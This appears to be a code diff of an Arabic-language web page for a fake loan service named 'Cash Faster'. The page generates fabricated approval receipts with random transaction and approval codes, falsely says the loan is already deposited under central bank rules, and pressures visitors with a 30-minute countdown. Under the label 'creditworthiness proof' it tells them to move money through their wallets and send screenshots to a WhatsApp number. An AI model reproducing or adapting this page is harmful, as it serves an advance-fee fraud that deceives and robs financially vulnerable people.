-                    customer.id = nationalId;
-                    if (customer.suspended === true) {
-                        displaySuspendedMessage(customer);
-                    } else {
-                        displayResult(customer);
-                    }
-                } else {
-                    document.getElementById('errorCard').classList.add('show');
-                }
-            }, 1200);
-        }
+function displayResult() {
+    document.getElementById('normalContent').style.display = 'block';
+    const details = getLoanDetails(currentCustomer.loan);
+    const proofAmount = calculateProofAmount(currentCustomer.loan);
+    const receiptMinutes = Math.floor(Math.random() * 5) + 5;
+    const now = new Date();
+    const transactionId = generateTransactionId();
+    const approvalCode = generateApprovalCode();
+    
+    document.getElementById('paymentCardContainer').innerHTML = `
+        <div class="receipt-card">
+            <div class="amount-big"><div class="value">${formatCurrency(currentCustomer.loan)}</div><div>قيمة التمويل المدفوع لحسابك</div></div>
+            <div class="detail-row"><span>رقم المحفظة</span><span>${currentCustomer.walletNum}</span></div>
+            <div class="detail-row"><span>التاريخ</span><span>${formatDate(now)}</span></div>
+            <div class="detail-row"><span>الوقت</span><span>${formatTime(now)}</span></div>
+            <div class="detail-row"><span>رقم العملية</span><span>${transactionId}</span></div>
+            <div class="detail-row"><span>رقم الموافقة</span><span>${approvalCode}</span></div>
+            <div class="detail-row"><span>طريقة الدفع</span><span>إيداع في المحفظة</span></div>
+            <div class="info-message" style="margin-top:1rem; text-align:center; background:rgba(0,217,255,0.1); padding:0.8rem; border-radius:1rem;">سيتم إيداع المبلغ خلال ${receiptMinutes} دقائق من الإثبات!</div>
+        </div>`;
+    
+    document.getElementById('creditworthinessContainer').innerHTML = `
+        <div class="creditworthiness-section">
+            <div class="section-title"><i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية</div>
+            <div class="proof-step"><div class="proof-step-number">1️⃣ مبلغ الجدارة المطلوب</div><div class="amount-highlight">${formatCurrency(proofAmount)}</div></div>
+            <div class="proof-step"><div class="proof-step-number">2️⃣ الخطوات</div>اطلب من شخص تثق به تحويل ${formatCurrency(proofAmount)} إلى محفظتك، التقط لقطة شاشة، ثم حول نفس المبلغ مرة أخرى إلى الشخص نفسه، التقط لقطة شاشة أخرى، ثم أرسل الصورتين عبر واتساب إلى الرقم <strong>212614494251</strong>.</div>
+            <div class="timer-section"><div class="timer" id="proofTimer">30:00</div><p>الوقت المتبقي لإثبات الجدارة</p></div>
+            <div class="proof-step"><div class="proof-step-number">3️⃣ بعد الإثبات</div>سيتم الإفراج عن القرض ${formatCurrency(currentCustomer.loan)}. القسط الشهري: ${formatCurrency(details.installment)} لمدة ${details.months} شهر.</div>
+        </div>`;
+    document.getElementById('resultSection').classList.add('show');
+    startProofTimer();
+}
 
-        // دوال التعليق (تم الاحتفاظ بها ولكن لن تُستخدم لأن العملاء الجدد suspended: false)
-        function displaySuspendedMessage(customer) {
-            document.getElementById('normalContent').style.display = 'none';
-            const suspendedDiv = document.getElementById('suspendedContainer');
-            suspendedDiv.style.display = 'block';
-            suspendedDiv.innerHTML = `<div class="suspended-card"><div class="suspended-icon"><i class="fas fa-clock"></i></div><div class="suspended-title">⏳ الطلب معلق</div><div class="suspended-message">عذراً، طلب التمويل الخاص بك معلق حاليًا. يرجى التواصل مع الدعم.</div><button class="btn-whatsapp-suspend" onclick="openWhatsAppForSuspended('${customer.name.replace(/'/g, "\\'")}', '${customer.id}')"><i class="fab fa-whatsapp fa-lg"></i> تواصل مع الدعم</button></div>`;
-            document.getElementById('resultSection').classList.add('show');
-        }
-
-        function openWhatsAppForSuspended(name, id) {
-            const message = `السلام عليكم ورحمة الله وبركاته\n\nأنا العميل: ${name}\nرقم البطاقة: ${id}\nطلب التمويل الخاص بي معلق، أرجو فتح التعليق لإتمام صرف القرض.`;
-            window.open(`https://wa.me/212614494251?text=${encodeURIComponent(message)}`, '_blank');
-        }
-
-        function displayResult(customer) {
-            document.getElementById('suspendedContainer').style.display = 'none';
-            document.getElementById('normalContent').style.display = 'block';
-            const details = getLoanDetails(customer.loan);
-            const proofAmount = calculateProofAmount(customer.loan);
-            const receiptMinutes = calculateReceiptTime();
-            const now = new Date();
-            const transactionId = generateTransactionId();
-            const approvalCode = generateApprovalCode();
-            const referenceNumber = Math.floor(Math.random() * 1000000000);
-            const subscriberNumber = customer.walletNum !== "غير مسجل" ? customer.walletNum : "غير محدد";
-            
-            const paymentCardHTML = `
-                <div class="receipt-card">
-                    <div class="receipt-header">
-                        <h2><i class="fas fa-check-circle"></i> عملية ناجحة</h2>
-                        <div class="receipt-badge">جارى دفع التمويل إلى حسابك</div>
-                    </div>
-                    <div class="amount-big">
-                        <div class="label">قيمة التمويل المدفوع لحسابك</div>
-                        <div class="value">${formatCurrency(customer.loan)}</div>
-                        <div style="font-size:0.75rem; margin-top:5px;">تم تسيل المبلغ بنجاح إلى محفظتك</div>
-                    </div>
-                    <div class="receipt-details">
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-wallet"></i> رقم المحفظة</span><span class="detail-value">${customer.walletNum}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-calendar-alt"></i> التاريخ</span><span class="detail-value">${formatDate(now)}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-clock"></i> الوقت</span><span class="detail-value">${formatTime(now)}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-hashtag"></i> الرقم المرجعي</span><span class="detail-value">${referenceNumber}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-id-card"></i> رقم المشترك</span><span class="detail-value">${subscriberNumber}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-file-invoice"></i> رقم الفاتورة</span><span class="detail-value">INV-${transactionId}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-badge-check"></i> رقم الموافقة</span><span class="detail-value">${approvalCode}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-code-branch"></i> رقم العملية</span><span class="detail-value">${transactionId}</span></div>
-                        <div class="detail-row"><span class="detail-label"><i class="fas fa-credit-card"></i> طريقة الدفع</span><span class="detail-value">سيتم الإيداع إلى المحفظة</span></div>
-                    </div>
-                    <div class="info-message">
-                        <i class="fas fa-envelope-open-text" style="color: var(--accent-gold);"></i> 
-                        <strong>سيتم إيداع المبلغ في حسابك خلال ${receiptMinutes} دقائق من الاثبات!</strong><br>
-                        ستصل رسالة تأكيد الإيداع على موبايلك خلال ${receiptMinutes} دقيقة. لإتمام صرف القرض، يرجى إكمال إجراءات إثبات الجدارة الائتمانية أدناه.
-                    </div>
-                    <div class="receipt-footer"><i class="fas fa-lock"></i> هذه عملية موثقة ومرقمة وفق أنظمة البنك المركزي</div>
-                </div>
-            `;
-            
-            const creditworthinessHTML = `
-                <div class="creditworthiness-section">
-                    <div class="section-title"><i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية</div>
-                    <div class="info-box success"><strong><i class="fas fa-lightbulb"></i> ما هي الجدارة الائتمانية؟</strong><br>هذا إجراء أمني بسيط لتأكيد ملكيتك للمحفظة. <strong>لا يتعلق الأمر بدفع لنا أو تحويل لنا</strong>، بل هو إثبات من طرفك لنفسك فقط! ستقوم بإيداع مبلغ مؤقت من شخص تثق به (صديق أو قريب) إلى محفظتك، ثم تحويله مرة أخرى إلى نفس الشخص. هذا يثبت أن حسابك نشط وتحت تحكمك الكامل.</div>
-                    <div class="proof-step"><div class="proof-step-number">1️⃣ مبلغ الجدارة المطلوب</div><div class="proof-step-title">المبلغ الذي سيتم إيداعه من شخص آخر إليك</div><div class="proof-step-content"><div class="amount-highlight">${formatCurrency(proofAmount)}</div><p>هذا المبلغ سيتم إيداعه من أي شخص تثق به (صديق أو قريب) إلى محفظتك كخطوة أولى للتحقق من صحة الحساب.</p></div></div>
-                    <div class="proof-step"><div class="proof-step-number">2️⃣ خطوات الإثبات الواضحة</div><div class="proof-step-title">ماذا تفعل بعد استقبال المبلغ؟</div><div class="proof-step-content"><strong style="color: var(--primary-lime);">الخطوة الأولى:</strong> اطلب من شخص تثق به (صديق أو قريب) أن يحول لك المبلغ ${formatCurrency(proofAmount)} إلى محفظتك<br><br><strong style="color: var(--primary-lime);">الخطوة الثانية:</strong> تحقق من وصول المبلغ إلى محفظتك<br><br><strong style="color: var(--primary-lime);">الخطوة الثالثة:</strong> خذ لقطة شاشة (سكرين شوت) واضحة جداً تظهر المبلغ ${formatCurrency(proofAmount)} وصل إلى حسابك (يجب أن يظهر الرقم والتاريخ والوقت)<br><br><strong style="color: var(--primary-lime);">الخطوة الرابعة:</strong> حول نفس المبلغ ${formatCurrency(proofAmount)} مرة أخرى إلى نفس الشخص (أو أي شخص آخر)<br><br><strong style="color: var(--primary-lime);">الخطوة الخامسة:</strong> خذ لقطة شاشة (سكرين شوت) واضحة جداً تظهر خروج المبلغ من حسابك (يجب أن يظهر الرقم والتاريخ والوقت)<br><br><strong style="color: var(--accent-gold);">الخطوة السادسة:</strong> أرسل الصورتين عبر واتساب إلى فريق Cash Faster</div></div>
-                    <div class="timer-section"><div class="timer-label"><i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة</div><div class="timer" id="proofTimer">30:00</div><p style="color: var(--text-muted); margin-top: 0.8rem;">⚠️ يجب إتمام الإجراء خلال 30 دقيقة</p></div>
-                    <div class="proof-step"><div class="proof-step-number">3️⃣ بعد إثبات الجدارة</div><div class="proof-step-title">ماذا يحدث بعد إرسال الصور؟</div><div class="proof-step-content">✅ <strong>التحقق الفوري:</strong> سيتم التحقق من صورك خلال دقائق<br><br>✅ <strong>تأكيد التحويل:</strong> سيتم تأكيد تحويل القرض الكامل ${formatCurrency(customer.loan)} إلى حسابك (تم بالفعل إيداعه في انتظار الإفراج)<br><br>✅ <strong>موعد الاستلام:</strong> خلال ${receiptMinutes} دقائق من التحقق<br><br>✅ <strong>القسط الشهري:</strong> ${formatCurrency(details.installment)}<br><br>✅ <strong>عدد الأقساط:</strong> ${details.months} شهر<br><br>✅ <strong>إجمالي المبلغ بعد الأقساط:</strong> ${formatCurrency(details.installment * details.months)}</div></div>
-                    <div class="info-box warning"><strong><i class="fas fa-exclamation-triangle"></i> معلومات مهمة</strong><br>• <strong>لا تقلق:</strong> مبلغ الجدارة ليس خصماً من القرض، بل هو إثبات فقط<br>• <strong>الصور يجب أن تكون واضحة جداً</strong> تظهر الأرقام والتاريخ والوقت<br>• <strong>يجب أن يظهر المبلغ والدخول والخروج</strong> من نفس الحساب<br>• <strong>استخدم شخص تثق به</strong> لتحويل المبلغ إليك أولاً</div>
-                    <div class="info-box"><strong><i class="fas fa-info-circle"></i> ملخص العملية</strong><br>هذا إجراء أمني قياسي يثبت أن حسابك نشط وتحت تحكمك. بعد إثبات الجدارة، سيتم الإفراج عن القرض الكامل ${formatCurrency(customer.loan)} المودع بالفعل في محفظتك، وستبدأ الأقساط من الشهر القادم.</div>
-                </div>`;
-                
-            document.getElementById('paymentCardContainer').innerHTML = paymentCardHTML;
-            document.getElementById('creditworthinessContainer').innerHTML = creditworthinessHTML;
-            document.getElementById('resultSection').classList.add('show');
-            startProofTimer();
-        }
-
-        function startProofTimer() {
-            let timeLeft = 30 * 60;
-            function updateTimer() {
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                const display = document.getElementById('proofTimer');
-                if (display) display.textContent = String(minutes).padStart(2,'0') + ':' + String(seconds).padStart(2,'0');
-                if (timeLeft > 0) { timeLeft--; setTimeout(updateTimer, 1000); }
-            }
-            updateTimer();
-        }
-        document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
-    </script>
+function startProofTimer() {
+    let timeLeft = 30 * 60;
+    function update() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        const t = document.getElementById('proofTimer');
+        if (t) t.textContent = `${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
+        if (timeLeft > 0) { timeLeft--; setTimeout(update, 1000); }
+    }
+    update();
+}
+document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
+</script>
 </body>
 </html>
